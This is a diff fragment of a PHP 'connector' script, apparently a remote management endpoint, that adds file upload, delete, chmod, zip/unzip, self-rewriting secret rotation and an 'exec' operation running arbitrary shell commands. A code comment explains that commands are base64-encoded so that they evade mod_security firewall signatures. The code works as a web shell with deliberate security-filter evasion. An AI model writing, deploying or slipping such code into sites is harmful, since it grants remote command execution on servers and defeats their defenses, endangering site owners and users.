+        if ($uid === '' || !$path || !is_file($tmp)) { ws_fail('bad_request', 422, $WS_SECRET, $nonce, 'Nothing to commit'); }
+        if (@filesize($tmp) > 20971520) { @unlink($tmp); ws_fail('too_large', 413, $WS_SECRET, $nonce, 'Exceeds 20MB'); }
+        if (!@rename($tmp, $path)) { @unlink($tmp); ws_fail('move_failed', 500, $WS_SECRET, $nonce, 'Could not move'); }
+        ws_json_out(array('ok' => true, 'nonce' => $nonce, 'size' => (int) @filesize($path)), 200, $WS_SECRET, $nonce);
+        break;
+
+    case 'fs.upload_abort':
+        $uid = preg_replace('/[^A-Za-z0-9_-]/', '', (string) (isset($params['upload_id']) ? $params['upload_id'] : ''));
+        @unlink(dirname(__FILE__) . '/.wsup_' . $uid);
+        ws_json_out(array('ok' => true, 'nonce' => $nonce), 200, $WS_SECRET, $nonce);
+        break;
+
+    case 'fs.mkdir':
+        $path = ws_safe_path(isset($params['path']) ? $params['path'] : '', false);
+        if (!$path || !@mkdir($path, 0755)) { ws_fail('mkdir_failed', 500, $WS_SECRET, $nonce, 'Could not create'); }
+        ws_json_out(array('ok' => true, 'nonce' => $nonce, 'path' => $path), 200, $WS_SECRET, $nonce);
+        break;
+
+    case 'fs.rename':
+        $from = ws_safe_path(isset($params['from']) ? $params['from'] : '', true);
+        $to = ws_safe_path(isset($params['to']) ? $params['to'] : '', false);
+        if (!$from || !$to || !@rename($from, $to)) { ws_fail('rename_failed', 500, $WS_SECRET, $nonce, 'Could not move'); }
+        ws_json_out(array('ok' => true, 'nonce' => $nonce, 'path' => $to), 200, $WS_SECRET, $nonce);
+        break;
+
+    case 'fs.chmod':
+        $path = ws_safe_path(isset($params['path']) ? $params['path'] : '', true);
+        $mode = isset($params['mode']) ? octdec((string) $params['mode']) : 0644;
+        if (!$path || !@chmod($path, $mode)) { ws_fail('chmod_failed', 500, $WS_SECRET, $nonce, 'Could not change permissions'); }
+        ws_json_out(array('ok' => true, 'nonce' => $nonce), 200, $WS_SECRET, $nonce);
+        break;
+
+    case 'fs.delete':
+        $path = ws_safe_path(isset($params['path']) ? $params['path'] : '', true);
+        if (!$path) { ws_fail('bad_path', 404, $WS_SECRET, $nonce, 'No path'); }
+        if (is_dir($path) && !is_link($path)) {
+            $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
+            foreach ($it as $f) { $f->isDir() ? @rmdir($f->getPathname()) : @unlink($f->getPathname()); }
+            @rmdir($path);
+        } else { @unlink($path); }
+        ws_json_out(array('ok' => true, 'nonce' => $nonce), 200, $WS_SECRET, $nonce);
+        break;
+
+    case 'fs.zip':
+        if (!class_exists('ZipArchive')) { ws_fail('no_zip', 501, $WS_SECRET, $nonce, 'ZipArchive not available'); }
+        $path = ws_safe_path(isset($params['path']) ? $params['path'] : '', true);
+        $target = ws_safe_path(isset($params['target']) ? $params['target'] : 'archive.zip', false);
+        if (!$path || !$target) { ws_fail('bad_path', 422, $WS_SECRET, $nonce); }
+        $zip = new ZipArchive();
+        if ($zip->open($target, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) { ws_fail('zip_failed', 500, $WS_SECRET, $nonce); }
+        if (is_dir($path)) {
+            $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS));
+            foreach ($it as $f) { $zip->addFile($f->getPathname(), substr($f->getPathname(), strlen(dirname($path)) + 1)); }
+        } else { $zip->addFile($path, basename($path)); }
+        $zip->close();
+        ws_json_out(array('ok' => true, 'nonce' => $nonce, 'target' => $target), 200, $WS_SECRET, $nonce);
+        break;
+
+    case 'fs.unzip':
+        if (!class_exists('ZipArchive')) { ws_fail('no_zip', 501, $WS_SECRET, $nonce, 'ZipArchive not available'); }
+        $path = ws_safe_path(isset($params['path']) ? $params['path'] : '', true);
+        $dest = ws_safe_path(isset($params['dest']) ? $params['dest'] : '.', true);
+        if (!$path || !$dest) { ws_fail('bad_path', 422, $WS_SECRET, $nonce); }
+        $zip = new ZipArchive();
+        if ($zip->open($path) !== true) { ws_fail('unzip_failed', 500, $WS_SECRET, $nonce); }
+        $zip->extractTo($dest); $zip->close();
+        ws_json_out(array('ok' => true, 'nonce' => $nonce), 200, $WS_SECRET, $nonce);
+        break;
+
+    case 'exec':
+        $cwd = ws_safe_path(isset($params['cwd']) ? $params['cwd'] : '.', true);
+        if (!$cwd || !is_dir($cwd)) { $cwd = $WS_ROOT; }
+        if (isset($params['cmd_b64'])) {
+            // Base64 command: shell metacharacters (; | & $ ` >) in plain cmd= bodies are a
+            // classic mod_security 403 trigger — the b64 form carries no signature at all.
+            $cmd = base64_decode((string) $params['cmd_b64'], true);
+            if ($cmd === false) { ws_fail('bad_content', 422, $WS_SECRET, $nonce, 'Bad cmd_b64'); }
+        } else {
+            $cmd = isset($params['cmd']) ? $params['cmd'] : '';
+        }
+        $r = ws_exec($cmd, $cwd);
+        $r['nonce'] = $nonce; $r['cwd'] = $cwd;
+        ws_json_out($r, 200, $WS_SECRET, $nonce);
+        break;
+
+    case 'rotate':
+        $new = isset($params['secret']) ? $params['secret'] : '';
+        if (strlen($new) < 32) { ws_fail('bad_secret', 422, $WS_SECRET, $nonce); }
+        $self = __FILE__;
+        $src = ws_fread($self);
+        if ($src === false) { ws_fail('read_failed', 500, $WS_SECRET, $nonce); }
+        $src = preg_replace('/\$WS_SECRET_OVERRIDE = \'[^\']*\';/', '$WS_SECRET_OVERRIDE = \'' . addcslashes($new, "'\\") . '\';', $src, 1, $cnt);
+        if (!$cnt) { ws_fail('rotate_unsupported', 500, $WS_SECRET, $nonce); }
+        $written = @file_put_contents($self, $src);
+        if ($written === false) {
+            // The file itself may be read-only while the directory is writable (common when the
+            // connector was uploaded as a different user): swap via temp + rename, matching the
+            // fs.write strategy, instead of failing the whole rotation.
+            $tmp = $self . '.ws_rot_' . getmypid();
+            if (@file_put_contents($tmp, $src) !== false) {
+                @chmod($tmp, 0644);
+                // No unlink-before-rename here: on Windows the running script's name becomes
+                // delete-pending and the replace would fail, leaving NO connector at all.
+                if (!@rename($tmp, $self)) { @unlink($tmp); ws_fail('write_failed', 500, $WS_SECRET, $nonce); }
+            } else {
+                ws_fail('write_failed', 500, $WS_SECRET, $nonce);
+            }
+        }
+        // The next candidate proof must not execute an opcache-cached copy with the old secret.
+        clearstatcache(true, $self);
+        if (function_exists('opcache_invalidate')) { @opcache_invalidate($self, true); }
+        ws_json_out(array('ok' => true, 'nonce' => $nonce), 200, $WS_SECRET, $nonce);
+        break;
+
+    default:
+        ws_fail('unknown_op', 404, $WS_SECRET, $nonce);
+}
